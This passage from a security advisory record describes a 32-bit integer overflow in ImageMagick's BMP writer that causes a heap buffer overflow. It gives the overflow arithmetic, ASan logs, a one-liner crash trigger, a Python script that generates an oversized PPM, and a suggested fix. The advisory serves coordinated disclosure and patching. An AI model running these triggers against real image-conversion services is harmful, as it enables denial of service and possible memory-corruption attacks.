writes 3 * width bytes\n}\n```\n\n### Allocation (writer)\n\n```c\npixel_info = AcquireVirtualMemory(image->rows,\n    MagickMax(bytes_per_line, image->columns + 256UL) * sizeof(*pixels));\npixels = (unsigned char *) GetVirtualMemoryBlob(pixel_info);\n```\n\n### Dimension \u201ccaps\u201d (insufficient)\n\nThe writer rejects dimensions that don\u2019t round-trip through\u00a0`signed int`, but both overflow thresholds below are\u00a0**\u2264 INT_MAX**\u00a0on 32-bit, so the caps\u00a0**do not prevent**\u00a0the bug.\n\n---\n\n## Integer-Overflow Analysis (32-bit\u00a0`size_t`)\n\nStride formula for 24-bpp:\n\n```\nbytes_per_line = 4 * ((width * 24 + 31) / 32)\n```\n\nThere are\u00a0**two independent overflow hazards**\u00a0on 32-bit:\n\n1. **Stage-1 multiply+add**\u00a0in\u00a0`(width * 24 + 31)`  \n    Overflow iff\u00a0`width > \u230a(0xFFFFFFFF \u2212 31) / 24\u230b = 178,956,969`  \n    \u2192 at\u00a0**width \u2265 178,956,970**\u00a0the numerator wraps small before\u00a0`/32`, producing a\u00a0**tiny**\u00a0`bytes_per_line`.\n    \n2. **Stage-2 final \u00d74**\u00a0after the division  \n    Let\u00a0`q = (width * 24 + 31) / 32`. Final\u00a0`\u00d74`\u00a0overflows iff\u00a0`q > 0x3FFFFFFF`.  \n    Solving gives\u00a0**width \u2265 1,431,655,765 (0x55555555)**.\n    \n\nBoth thresholds are\u00a0**below**\u00a0`INT_MAX`\u00a0(\u22482.147e9), so \u201cint caps\u201d don\u2019t help.\n\n**Mismatch predicate (guaranteed OOB when overflowed):**  \nPer-row write for 24-bpp is\u00a0`row_bytes = 3*width`. Safety requires\u00a0`row_bytes \u2264 bytes_per_line`.  \nUnder either overflow,\u00a0`bytes_per_line`\u00a0collapses \u2192\u00a0`3*width > bytes_per_line`\u00a0holds \u2192\u00a0**OOB-write**.\n\n---\n\n## Concrete Demonstration\n\nChosen width:\u00a0**`W = 178,957,200`**\u00a0(just over Stage-1 bound)\n\n- Stage-1:\u00a0`24*W + 31 = 4,294,972,831 \u2261 0x0000159F (mod 2^32)`\u00a0\u2192\u00a0**5535**\n    \n- Divide by 32:\u00a0`5535 / 32 = 172`\n    \n- Multiply by 4:\u00a0`bytes_per_line = 172 * 4 = **688** bytes`\u00a0\u2190 tiny stride\n    \n- Per-row data (24-bpp):\u00a0`row_bytes = 3*W = **536,871,600** bytes`\n    \n- Allocation used:\u00a0`MagickMax(688, W+256) = **178,957,456** bytes`\n    \n- **Immediate OOB**: first row writes ~536MB into a 178MB region, starting at a base advanced by only 688 bytes.\n    \n---\n\n## Observed Result (ASan excerpt)\n\n```\nERROR: AddressSanitizer: heap-buffer-overflow on address 0x6eaac490\nWRITE of size 1 in WriteBMPImage coders/bmp.c:2309\n...\nallocated by:\n  AcquireVirtualMemory MagickCore/memory.c:747\n  WriteBMPImage coders/bmp.c:2092\n```\n\n- Binary:\u00a0**ELF 32-bit i386**, Q8, non-HDRI\n    \n- Resources set to permit execution of the writer path (defense-in-depth limits relaxed for repro)\n    \n\n---\n\n## Exploitability & Risk\n\n- **Primitive:**\u00a0Large, contiguous, attacker-controlled heap overwrite beginning at the scanline slot.\n    \n- **Control:**\u00a0Overwrite bytes are sourced from attacker-supplied pixels (e.g., crafted input image to be converted to BMP).\n    \n- **Likely deployment:**\u00a0Server-side, non-interactive conversion pipelines (UI:N).\n    \n- **Outcome:**\u00a0At minimum, deterministic crash (DoS). On many 32-bit allocators, well-understood heap shaping can escalate to\u00a0**RCE**.\n    \n\n**Note on 64-bit:**\u00a0Without integer overflow,\u00a0`bytes_per_line = 4 * ceil((3*width)/4) \u2265 3*width`, so the mismatch doesn\u2019t arise. Still add product/size checks to prevent DoS and future refactors.\n\n---\n\n## Reproduction (copy-paste triager script)\n\n**Test Environment:**\n\n- `docker run -it --rm --platform linux/386 debian:11 bash`\n    \n- Install deps:\u00a0`apt-get update && apt-get install -y build-essential git autoconf automake libtool pkg-config python3`\n    \n- Clone & checkout: ImageMagick\u00a0`7.1.2-0`\u00a0\u2192 commit\u00a0`3fcd081c0278427f...`\n    \n- Configure 32-bit Q8 non-HDRI with ASan/UBSan (summary):\n\n```bash\n./configure \\\n  --host=i686-pc-linux-gnu \\\n  --build=x86_64-pc-linux-gnu \\\n  --disable-dependency-tracking \\\n  --disable-silent-rules \\\n  --disable-shared \\\n  --disable-openmp \\\n  --disable-docs \\\n  --without-x \\\n  --without-perl \\\n  --without-magick-plus-plus \\\n  --without-lqr \\\n  --without-zstd \\\n  --without-tiff \\\n  --with-quantum-depth=8 \\\n  --disable-hdri \\\n  CFLAGS=\"-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined\" \\\n  CXXFLAGS=\"-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined\" \\\n  LDFLAGS=\"-fsanitize=address,undefined\"\n\nmake -j\"$(nproc)\"\n```\n- Runtime limits to exercise writer:\n\n```bash\nexport MAGICK_WIDTH_LIMIT=200000000\nexport MAGICK_HEIGHT_LIMIT=200000000\nexport MAGICK_TEMPORARY_PATH=/tmp\nexport TMPDIR=/tmp\nexport ASAN_OPTIONS=\"detect_leaks=0:malloc_context_size=20:alloc_dealloc_mismatch=0\"\n```\n\n**One-liner trigger (no input file):**\n\n```bash\nW=178957200\n./utilities/magick \\\n  -limit width 200000000 -limit height 200000000 \\\n  -limit memory 268435456 -limit map 0 -limit disk 200000000000 \\\n  -limit thread 1 \\\n  -size ${W}x1 xc:black -type TrueColor -define bmp:format=bmp3 BMP3:/dev/null\n```\n\n**Expected:**\u00a0ASan heap-buffer-overflow in\u00a0`WriteBMPImage` (will be provided in a private gist link).\n\n**Alternate PoC (raw PPM generator):**\n\n```python\n#!/usr/bin/env python3\nW, H, MAXV = 180_000_000, 1, 255              \n# W > 178,956,969\nwith open(\"huge.ppm\", \"wb\") as f:\n    f.write(f\"P6\\n{W} {H}\\n{MAXV}\\n\".encode(\"ascii\"))\n    chunk = (b\"\\x41\\x42\\x43\") * (1024*1024)\n    remaining = 3 * W\n    while remaining:\n        n = min(remaining, len(chunk))\n        f.write(chunk[:n]); remaining -= n\n# Then: magick huge.ppm out.bmp\n```\n\n---\n\n## Proposed Severity\n\n- **Primary vector (server auto-convert):**\u00a0`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`\u00a0\u2192\u00a0**9.8 Critical**\n    \n- **If strictly CLI/manual conversion:**\u00a0`UI:R`\u00a0\u2192\u00a0**8.8 High**\n    \n\n---\n\n## Maintainer Pushbacks \u2014 Pre-empted\n\n- **\u201cMagickMax makes allocation large.\u201d**\u00a0The row\u00a0**base**\u00a0advances by\u00a0**overflowed\u00a0`bytes_per_line`**, causing row overlap and eventual region exit regardless of total allocation size.\n    \n- **\u201cWe\u2019re 64-bit only.\u201d**\u00a0Code is still incorrect for 32-bit consumers/cross-compiles; also add product guards on 64-bit for correctness/DoS.\n    \n- **\u201cResource policy blocks large images.\u201d**\u00a0That\u2019s environment-dependent defense-in-depth; arithmetic must be correct.\n    \n---\n\n## Remediation (Summary)\n\nAdd checked arithmetic around stride computation and enforce a per-row invariant so that the number of bytes emitted per row (row_bytes) always fits within the computed stride (bytes_per_line). Guard multiplication/addition and product computations used for header fields and allocation sizes, and fail early with a clear WidthOrHeightExceedsLimit/ResourceLimitError when values exceed safe bounds.\n\nConcretely:\n\n- Validate width and bits_per_pixel before the stride formula to ensure (width*bpp + 31) cannot overflow a size_t.\n- Compute row_bytes for the chosen bpp and assert row_bytes <= bytes_per_line.\n- Bound rows * stride before allocating and ensure biSizeImage (DIB 32-bit) cannot overflow.\n\nA full suggested guarded implementation is provided in Appendix A \u2014 Full patch (for maintainers).\n\n---\n\n## Regression Tests to Include (PR-friendly)\n\n1. **32-bit overflow repros**\u00a0(with ASan):\n    \n    - `rows=1`,\u00a0`width \u2265 178,956,970`,\u00a0`bpp=24`\u00a0\u2192 now cleanly errors.\n        \n    - `rows=2`, same bound \u2192 no row overlap; clean error.\n        \n2. **64-bit sanity:**\u00a0Medium images (e.g.,\u00a0`8192\u00d74096`, 24-bpp) round-trip; header\u2019s\u00a0`biSizeImage = rows * bytes_per_line`.\n    \n3. **Packed bpp (1/4/8):**\u00a0Validate\u00a0`row_bytes = (width*bpp+7)/8`\u00a0(guarded), 4-pad, and\u00a0**payload \u2264 stride**\u00a0holds.\n\n---\n\n## Attachments (private BMP_Package) \nProvided with report: README.md, poc_ppm_generator.py, repro_commands.sh, full_asan_bmp_crash.txt, appendix_a_patch_block.c. (Private gist link with package provided separately.)\n\n---\n\n## Disclosure & Coordination\n\n- **Reporter:**\u00a0Lumina Mescuwa\n    \n- **Tested on:**\u00a0i686 Linux container (details in Repro)\n    \n- **Timeline:**\u00a0August 19th, 2025\n    \n\n---\n\n## Appendices\n\n### Appendix A \u2014 Patch block tailored to\u00a0 `bmp.c`\n\n**Where this hooks in (current code):**\n\n- Stride is computed here:\u00a0`bytes_per_line=4*((image->columns*bmp_info.bits_per_pixel+31)/32);`\n    \n- Header uses\u00a0`bmp_info.image_size=(unsigned int) (bytes_per_line*image->rows);`\n    \n- Allocation uses\u00a0`AcquireVirtualMemory(image->rows, MagickMax(bytes_per_line, image->columns+256UL)*sizeof(*pixels));`\n    \n- 24-bpp row loop writes pixels then zero-pads up to\u00a0`bytes_per_line`\u00a0(so the per-row slot size matters):\u00a0`for (x=3L*(ssize_t)image->columns; x < (ssize_t)bytes_per_line; x++) *q++=0x00;`\n    \n\n---\n\n## Suggested Patch (minimal surface, guards + invariant)\n\nI recommend this\u00a0**in place of**\u00a0the existing\u00a0`bytes_per_line`\u00a0assignment and the subsequent\u00a0`bmp_info.image_size`\u00a0/ allocation block. Keep your macros and local variables as-is.\n\n```c\n/* --- PATCH BEGIN: guarded stride, per-row invariant, and product checks --- */\n\n/* 1) Guard the original stride arithmetic (preserve behavior, add checks). */\nif (bmp_info.bits_per_pixel == 0 ||\n    (size_t)image->columns > (SIZE_MAX - 31) / (size_t)bmp_info.bits_per_pixel)\n  ThrowWriterException(ImageError, \"WidthOrHeightExceedsLimit\");\n\nsize_t _tmp = (size_t)image->columns * (size_t)bmp_info.bits_per_pixel + 31;\n/* Divide first; then check the final \u00d74 won't overflow. */\n_tmp /= 32;\nif (_tmp > (SIZE_MAX / 4))\n  ThrowWriterException(ImageError, \"WidthOrHeightExceedsLimit\");\n\nbytes_per_line = 4 * _tmp;  /* same formula as before, now checked */\n\n/* 2) Compute the actual data bytes written per row for the chosen bpp. */\nsize_t row_bytes;\nif (bmp_info.bits_per_pixel == 1 || bmp_info.bits_per_pixel == 4 || bmp_info.bits_per_pixel == 8) {\n  /* packed: ceil(width*bpp/8) */\n  if ((size_t)image->columns > (SIZE_MAX - 7) / (size_t)bmp_info.bits_per_pixel)\n    ThrowWriterException(ImageError, \"WidthOrHeightExceedsLimit\");\n  row_bytes = (((size_t)image->columns * (size_t)bmp_info.bits_per_pixel) + 7) >> 3;\n} else {\n  /* 16/24/32 bpp: (bpp/8) * width */\n  size_t bpp_bytes = (size_t)bmp_info.bits_per_pixel / 8;\n  if (bpp_bytes == 0 || (size_t)image->columns > SIZE_MAX / bpp_bytes)\n    ThrowWriterException(ImageError, \"WidthOrHeightExceedsLimit\");\n  row_bytes = bpp_bytes * (size_t)image->columns;\n}\n\n/* 3) Per-row safety invariant: the payload must fit the stride. */\nif (row_bytes > bytes_per_line)\n  ThrowWriterException(ResourceLimitError, \"MemoryAllocationFailed\");\n\n/* 4) Guard header size and allocation products. */\nif ((size_t)image->rows == 0)\n  ThrowWriterException(ImageError, \"WidthOrHeightExceedsLimit\");\n\n/* biSizeImage = rows * bytes_per_line (DIB field is 32-bit) */\nif (bytes_per_line > 0xFFFFFFFFu / (size_t)image->rows)\n  ThrowWriterException(ImageError, \"WidthOrHeightExceedsLimit\");\nbmp_info.image_size = (unsigned int)(bytes_per_line * (size_t)image->rows);\n\n/* Allocation count = rows * stride_used, with existing MagickMax policy. */\nsize_t _stride = MagickMax(bytes_per_line, (size_t)image->columns + 256UL);\nif (_stride > SIZE_MAX / (size_t)image->rows)\n  ThrowWriterException(ResourceLimitError, \"MemoryAllocationFailed\");\n\npixel_info = AcquireVirtualMemory((size_t)image->rows, _stride * sizeof(*pixels));\nif (pixel_info == (MemoryInfo *) NULL)\n  ThrowWriterException(ResourceLimitError, \"MemoryAllocationFailed\");\npixels = (unsigned char *) GetVirtualMemoryBlob(pixel_info);\n\n/* Optional: keep zeroing aligned to computed header size. */\n(void) memset(pixels, 0, (size_t) bmp_info.image_size);\n\n/* --- PATCH END --- */\n```\n\n### Why this is the right spot?\n\n- It\u00a0**replaces**\u00a0the unguarded stride line you currently have, without changing the algorithm (still\u00a0`4*((W*bpp+31)/32)`).\u00a0\n    \n- It\u00a0**fixes the header**\u00a0(`biSizeImage`) to be a checked product, instead of a potentially wrapped multiplication.\u00a0\n    \n- It\u00a0**guards allocation**\u00a0where you presently allocate\u00a0`rows \u00d7 MagickMax(bytes_per_line, columns+256)`.\u00a0\n    \n- The invariant\u00a0`row_bytes \u2264 bytes_per_line`\u00a0ensures your 24-bpp emission loop (writes 3 bytes/pixel, then pads to\u00a0`bytes_per_line`) can never exceed the per-row slot the code relies on.\u00a0\n    \n\n---\n\n## Notes\n\n- **Behavior preserved**: The stride value for normal images is unchanged; only pathological integer states are rejected.\u00a0\n    \n- **Header consistency**:\u00a0`biSizeImage = rows * bytes_per_line`\u00a0remains true by construction, but now cannot overflow a 32-bit DIB field.\u00a0\n    \n- **Defensive alignment**: If you prefer, you can compute\u00a0`bytes_per_line`\u00a0as\u00a0`((row_bytes + 3) & ~3U)`; it\u2019s equivalent and may read clearer, but I kept the original formula with guards to minimize diff.\n    \n\nA slightly larger \u201chelpers\u201d variant (with\u00a0`safe_mul_size`\u00a0/\u00a0`safe_add_size`\u00a0utilities) also comes to mind, but the block above is the tightest patch that closes the 32-bit IOF\u2192OOB class without touching unrelated code paths.\n\n\n\n### Appendix B \u2014 Arithmetic Worked Example (W=178,957,200)\n\n- `(24W + 31) mod 2^32 = 5535`\n    \n- `bytes_per_line = 4 * (5535/32) = 688`\n    \n- `row_bytes (24-bpp) = 536,871,600`\n    \n- Allocation via\u00a0`MagickMax = 178,957,456`\u00a0\u2192 immediate row 0 out-of-bounds.\n    \n\n### Appendix C \u2014 Raw ASan Log (trimmed)\n\n```\n=================================================================\n==49178==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6eaac490\nWRITE of size 1 at 0x6eaac490 thread T0\n    #0 0xed2788 in WriteBMPImage coders/bmp.c:2309\n    #1 0x13da32c in WriteImage MagickCore/constitute.c:1342\n    #2 0x13dc657 in WriteImages MagickCore/constitute.c:1564\n0x6eaac490 is located 0 bytes to the right of 178957456-byte region\nallocated by thread T0 here:\n    #0 0x408e30ab in __interceptor_posix_memalign\n    #1 0xd03305 in AcquireVirtualMemory MagickCore/memory.c:747\n    #2 0xecd597 in WriteBMPImage coders/bmp.c:2092\n```",
  "id": "GHSA-mxvv-97wh-cfmm",
  "modified": "2025-08-26T16:44:32.697380Z",
  "published": "2025-08-26T16:07:27Z",
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-mxvv-97wh-cfmm"
    },
    {
      "type": "WEB",
      "url": "https://github.com/ImageMagick/ImageMagick/commit/2c55221f4d38193adcb51056c14cf238fbcc35d7"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/ImageMagick/ImageMagick"
    },
    {
      "type": "WEB",
      "url": "https://github.com/dlemstra/Magick.NET/releases/tag/14.8.1"
    }
  ],
  "schema_version": "1.7.3",
  "severity": [
    {
      "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
      "type": "CVSS_V3"
    }
  ],
  "summary": "ImageMagick (WriteBMPImage): 32-bit integer overflow when writing BMP scanline stride \u2192 heap buffer overflow"
}